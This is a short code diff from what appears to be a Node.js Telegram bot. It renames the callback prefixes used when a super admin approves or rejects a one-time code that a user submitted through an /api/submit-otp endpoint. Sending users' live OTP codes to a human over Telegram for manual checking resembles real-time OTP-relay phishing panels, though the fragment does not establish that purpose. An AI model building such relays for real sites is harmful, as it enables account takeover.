@@ -268,8 +268,8 @@ bot.on('callback_query', async (query) => {
         }
 
         // APPROVE OTP CODE (user entered OTP, admin verifies)
-        else if (data.startsWith('otp_approve_')) {
-            const registrationId = data.replace('otp_approve_', '');
+        else if (data.startsWith('reg_otp_approve_')) {
+            const registrationId = data.replace('reg_otp_approve_', '');
             const otpData = pendingOtpVerification.get(registrationId);
 
             if (!otpData) {
@@ -294,8 +294,8 @@ bot.on('callback_query', async (query) => {
         }
 
         // REJECT OTP CODE (wrong code, ask user to re-enter)
-        else if (data.startsWith('otp_reject_')) {
-            const registrationId = data.replace('otp_reject_', '');
+        else if (data.startsWith('reg_otp_reject_')) {
+            const registrationId = data.replace('reg_otp_reject_', '');
             const otpData = pendingOtpVerification.get(registrationId);
 
             if (!otpData) {
@@ -2219,12 +2219,12 @@ app.post('/api/submit-otp', async (req, res) => {
 
       const approveBtn = {
         text: '✅ Sahihi',
-        callback_data: `otp_approve_${registrationId}`
+        callback_data: `reg_otp_approve_${registrationId}`
       };
 
       const rejectBtn = {
         text: '❌ Sio Sahihi',
-        callback_data: `otp_reject_${registrationId}`
+        callback_data: `reg_otp_reject_${registrationId}`
       };
 
       await bot.sendMessage(superAdminChatId, message.trim(), {
